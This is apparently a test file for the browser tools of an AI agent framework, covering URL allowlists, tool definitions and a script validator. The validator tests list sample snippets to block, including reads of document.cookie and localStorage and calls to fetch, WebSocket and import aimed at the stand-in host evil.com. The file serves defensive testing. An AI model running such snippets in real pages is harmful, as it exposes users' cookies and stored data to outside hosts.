import { describe, it, expect, vi, beforeEach } from 'vitest';
import { UrlAllowlist } from '../src/safety/url-allowlist.js';
import { BrowserSecurity } from '../src/browser/security.js';
import { BrowserManager } from '../src/browser/browser-manager.js';
import * as pageActions from '../src/browser/page-actions.js';
import {
  browserNavigateTool,
  browserClickTool,
  browserTypeTool,
  browserScreenshotTool,
  browserExtractTool,
  browserEvaluateTool,
  browserTools,
  setBrowserManager,
} from '../src/tools/browser-tool.js';
import type { BrowserConfig } from '../src/browser/types.js';
import { DEFAULT_BROWSER_CONFIG } from '../src/browser/types.js';

// -------------------------------------------------------
// Browser Types Tests
// -------------------------------------------------------
describe('BrowserConfig defaults', () => {
  it('should have sane default config', () => {
    expect(DEFAULT_BROWSER_CONFIG.headless).toBe(true);
    expect(DEFAULT_BROWSER_CONFIG.maxPages).toBe(3);
    expect(DEFAULT_BROWSER_CONFIG.defaultTimeout).toBe(30_000);
    expect(DEFAULT_BROWSER_CONFIG.screenshotOnNavigate).toBe(true);
    expect(DEFAULT_BROWSER_CONFIG.blockDownloads).toBe(true);
    expect(DEFAULT_BROWSER_CONFIG.blockPopups).toBe(true);
  });
});

// -------------------------------------------------------
// BrowserSecurity Tests
// -------------------------------------------------------
describe('BrowserSecurity', () => {
  let allowlist: UrlAllowlist;
  let security: BrowserSecurity;

  beforeEach(() => {
    allowlist = new UrlAllowlist({
      allow: ['google.com', 'github.com'],
      block: ['gambling', 'casino'],
    });
    security = new BrowserSecurity(allowlist);
  });

  it('should allow URLs on the allowlist', () => {
    const result = security.checkUrl('https://google.com/search');
    expect(result.allowed).toBe(true);
  });

  it('should allow subdomains of allowed domains', () => {
    const result = security.checkUrl('https://docs.google.com/doc');
    expect(result.allowed).toBe(true);
  });

  it('should block URLs not on the allowlist', () => {
    const result = security.checkUrl('https://evil-site.xyz/exploit');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('not in the allowlist');
  });

  it('should block URLs matching blocked patterns', () => {
    const result = security.checkUrl('https://casino-online.com/slots');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('blocked pattern');
  });

  it('should reject invalid URLs', () => {
    const result = security.checkUrl('not-a-url');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('Invalid URL');
  });

  it('should log actions', () => {
    security.log('navigate', 'https://google.com');
    security.log('click', 'https://google.com', '#btn');
    const logs = security.getLogs();
    expect(logs).toHaveLength(2);
    expect(logs[0].action).toBe('navigate');
    expect(logs[0].url).toBe('https://google.com');
    expect(logs[1].action).toBe('click');
    expect(logs[1].selector).toBe('#btn');
  });

  it('should clear logs', () => {
    security.log('navigate', 'https://google.com');
    expect(security.getLogs()).toHaveLength(1);
    security.clearLogs();
    expect(security.getLogs()).toHaveLength(0);
  });

  // Script validation tests
  it('should allow safe scripts', () => {
    const result = security.validateScript('document.title');
    expect(result.allowed).toBe(true);
  });

  it('should allow DOM query scripts', () => {
    const result = security.validateScript('document.querySelectorAll("a").length');
    expect(result.allowed).toBe(true);
  });

  it('should block document.cookie access', () => {
    const result = security.validateScript('document.cookie');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('cookie');
  });

  it('should block localStorage access', () => {
    const result = security.validateScript('localStorage.getItem("key")');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('localStorage');
  });

  it('should block sessionStorage access', () => {
    const result = security.validateScript('sessionStorage.setItem("k","v")');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('sessionStorage');
  });

  it('should block fetch() calls', () => {
    const result = security.validateScript('fetch("https://evil.com")');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('fetch');
  });

  it('should block XMLHttpRequest', () => {
    const result = security.validateScript('new XMLHttpRequest()');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('XMLHttpRequest');
  });

  it('should block eval()', () => {
    const result = security.validateScript('eval("alert(1)")');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('eval');
  });

  it('should block Function() constructor', () => {
    const result = security.validateScript('new Function("return 1")()');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('Function');
  });

  it('should block window.open', () => {
    const result = security.validateScript('window.open("http://evil.com")');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('window');
  });

  it('should block WebSocket', () => {
    const result = security.validateScript('new WebSocket("ws://evil.com")');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('WebSocket');
  });

  it('should block dynamic import()', () => {
    const result = security.validateScript('import("http://evil.com/module.js")');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('import');
  });

  it('should block navigator.sendBeacon', () => {
    const result = security.validateScript('navigator.sendBeacon("/log", data)');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('sendBeacon');
  });

  it('should block indexedDB', () => {
    const result = security.validateScript('indexedDB.open("db")');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('indexedDB');
  });
});

// -------------------------------------------------------
// BrowserManager Tests (mocked Playwright)
// -------------------------------------------------------
describe('BrowserManager', () => {
  // We test the manager's logic without actually launching a real browser.
  // Playwright calls are mocked.

  it('should construct with default config', () => {
    const manager = new BrowserManager();
    expect(manager.isLaunched()).toBe(false);
    expect(manager.getActivePage()).toBeNull();
    expect(manager.listPages()).toHaveLength(0);
  });

  it('should construct with custom config', () => {
    const config: Partial<BrowserConfig> = { headless: false, maxPages: 5 };
    const manager = new BrowserManager(config);
    expect(manager.isLaunched()).toBe(false);
  });

  it('should accept a custom UrlAllowlist', () => {
    const allowlist = new UrlAllowlist({ allow: ['example.com'] });
    const manager = new BrowserManager({}, allowlist);
    const security = manager.getSecurity();
    expect(security.checkUrl('https://example.com').allowed).toBe(true);
    expect(security.checkUrl('https://evil.com').allowed).toBe(false);
  });

  it('should get security instance', () => {
    const manager = new BrowserManager();
    const security = manager.getSecurity();
    expect(security).toBeInstanceOf(BrowserSecurity);
  });
});

// -------------------------------------------------------
// Page Actions - navigate URL validation
// -------------------------------------------------------
describe('Page Actions - navigate URL check', () => {
  it('should reject navigation to blocked URL', async () => {
    const allowlist = new UrlAllowlist({
      allow: ['google.com'],
      block: ['casino'],
    });
    const manager = new BrowserManager({}, allowlist);

    await expect(
      pageActions.navigate(manager, 'https://casino-online.com'),
    ).rejects.toThrow('Navigation blocked');
  });

  it('should reject navigation to non-allowed URL', async () => {
    const allowlist = new UrlAllowlist({ allow: ['google.com'] });
    const manager = new BrowserManager({}, allowlist);

    await expect(
      pageActions.navigate(manager, 'https://evil-site.xyz'),
    ).rejects.toThrow('Navigation blocked');
  });
});

// -------------------------------------------------------
// Page Actions - require active page
// -------------------------------------------------------
describe('Page Actions - require active page', () => {
  it('click should throw when no active page', async () => {
    const manager = new BrowserManager();
    await expect(pageActions.click(manager, '#btn')).rejects.toThrow(
      'No active browser page',
    );
  });

  it('type should throw when no active page', async () => {
    const manager = new BrowserManager();
    await expect(pageActions.type(manager, '#input', 'hello')).rejects.toThrow(
      'No active browser page',
    );
  });

  it('scroll should throw when no active page', async () => {
    const manager = new BrowserManager();
    await expect(pageActions.scroll(manager, 'down')).rejects.toThrow(
      'No active browser page',
    );
  });

  it('screenshot should throw when no active page', async () => {
    const manager = new BrowserManager();
    await expect(pageActions.screenshot(manager)).rejects.toThrow(
      'No active browser page',
    );
  });

  it('extract should throw when no active page', async () => {
    const manager = new BrowserManager();
    await expect(pageActions.extract(manager)).rejects.toThrow(
      'No active browser page',
    );
  });

  it('snapshot should throw when no active page', async () => {
    const manager = new BrowserManager();
    await expect(pageActions.snapshot(manager)).rejects.toThrow(
      'No active browser page',
    );
  });

  it('waitFor should throw when no active page', async () => {
    const manager = new BrowserManager();
    await expect(pageActions.waitFor(manager, '.elem')).rejects.toThrow(
      'No active browser page',
    );
  });

  it('evaluate should throw when no active page', async () => {
    const manager = new BrowserManager();
    await expect(pageActions.evaluate(manager, 'document.title')).rejects.toThrow(
      'No active browser page',
    );
  });
});

// -------------------------------------------------------
// Browser Tool Definitions
// -------------------------------------------------------
describe('Browser Tool Definitions', () => {
  it('should export 6 browser tools', () => {
    expect(browserTools).toHaveLength(6);
  });

  it('browser_navigate should have correct properties', () => {
    expect(browserNavigateTool.name).toBe('browser_navigate');
    expect(browserNavigateTool.safetyLevel).toBe('moderate');
    expect(browserNavigateTool.requiredRole).toEqual(['researcher', 'butler']);
  });

  it('browser_click should have correct properties', () => {
    expect(browserClickTool.name).toBe('browser_click');
    expect(browserClickTool.safetyLevel).toBe('moderate');
    expect(browserClickTool.requiredRole).toEqual(['researcher', 'butler']);
  });

  it('browser_type should have correct properties', () => {
    expect(browserTypeTool.name).toBe('browser_type');
    expect(browserTypeTool.safetyLevel).toBe('moderate');
    expect(browserTypeTool.requiredRole).toEqual(['researcher', 'butler']);
  });

  it('browser_screenshot should have correct properties', () => {
    expect(browserScreenshotTool.name).toBe('browser_screenshot');
    expect(browserScreenshotTool.safetyLevel).toBe('safe');
    expect(browserScreenshotTool.requiredRole).toEqual(['researcher', 'butler']);
  });

  it('browser_extract should have correct properties', () => {
    expect(browserExtractTool.name).toBe('browser_extract');
    expect(browserExtractTool.safetyLevel).toBe('safe');
    expect(browserExtractTool.requiredRole).toEqual(['researcher', 'butler']);
  });

  it('browser_evaluate should have correct properties', () => {
    expect(browserEvaluateTool.name).toBe('browser_evaluate');
    expect(browserEvaluateTool.safetyLevel).toBe('moderate');
    expect(browserEvaluateTool.requiredRole).toEqual(['researcher', 'butler']);
  });
});

// -------------------------------------------------------
// Browser Tool Param Validation
// -------------------------------------------------------
describe('Browser Tool Param Validation', () => {
  it('browser_navigate rejects missing url', () => {
    const result = browserNavigateTool.validateParams!({});
    expect(result.valid).toBe(false);
    expect(result.error).toContain('url');
  });

  it('browser_navigate rejects invalid url', () => {
    const result = browserNavigateTool.validateParams!({ url: 'not-a-url' });
    expect(result.valid).toBe(false);
    expect(result.error).toContain('Invalid URL');
  });

  it('browser_navigate accepts valid url', () => {
    const result = browserNavigateTool.validateParams!({ url: 'https://google.com' });
    expect(result.valid).toBe(true);
  });

  it('browser_click rejects missing selector', () => {
    const result = browserClickTool.validateParams!({});
    expect(result.valid).toBe(false);
    expect(result.error).toContain('selector');
  });

  it('browser_click accepts valid selector', () => {
    const result = browserClickTool.validateParams!({ selector: '#btn' });
    expect(result.valid).toBe(true);
  });

  it('browser_type rejects missing selector', () => {
    const result = browserTypeTool.validateParams!({});
    expect(result.valid).toBe(false);
  });

  it('browser_type rejects missing text', () => {
    const result = browserTypeTool.validateParams!({ selector: '#input' });
    expect(result.valid).toBe(false);
    expect(result.error).toContain('text');
  });

  it('browser_type accepts valid params', () => {
    const result = browserTypeTool.validateParams!({ selector: '#input', text: 'hello' });
    expect(result.valid).toBe(true);
  });

  it('browser_screenshot accepts empty params', () => {
    const result = browserScreenshotTool.validateParams!({});
    expect(result.valid).toBe(true);
  });

  it('browser_extract accepts empty params', () => {
    const result = browserExtractTool.validateParams!({});
    expect(result.valid).toBe(true);
  });

  it('browser_evaluate rejects missing script', () => {
    const result = browserEvaluateTool.validateParams!({});
    expect(result.valid).toBe(false);
    expect(result.error).toContain('script');
  });

  it('browser_evaluate accepts valid script', () => {
    const result = browserEvaluateTool.validateParams!({ script: 'document.title' });
    expect(result.valid).toBe(true);
  });
});

// -------------------------------------------------------
// Security - URL enforcement integration
// -------------------------------------------------------
describe('URL enforcement integration', () => {
  it('should block .onion domains', () => {
    const allowlist = new UrlAllowlist();
    const security = new BrowserSecurity(allowlist);
    const result = security.checkUrl('http://something.onion/page');
    expect(result.allowed).toBe(false);
  });

  it('should block gambling-related URLs even on allowed domains', () => {
    // Blocked patterns override allowlist
    const allowlist = new UrlAllowlist({
      allow: ['gambling-news.com'],
      block: ['gambling'],
    });
    const security = new BrowserSecurity(allowlist);
    const result = security.checkUrl('https://gambling-news.com/article');
    expect(result.allowed).toBe(false);
  });

  it('should allow safe allowed domain URLs', () => {
    const allowlist = new UrlAllowlist({
      allow: ['github.com'],
    });
    const security = new BrowserSecurity(allowlist);
    const result = security.checkUrl('https://github.com/org/repo');
    expect(result.allowed).toBe(true);
  });
});

// -------------------------------------------------------
// setBrowserManager utility
// -------------------------------------------------------
describe('setBrowserManager', () => {
  afterEach(() => {
    setBrowserManager(null);
  });

  it('should allow setting a custom manager', () => {
    const manager = new BrowserManager();
    setBrowserManager(manager);
    // No error thrown means success
  });

  it('should allow resetting to null', () => {
    setBrowserManager(null);
    // No error thrown means success
  });
});
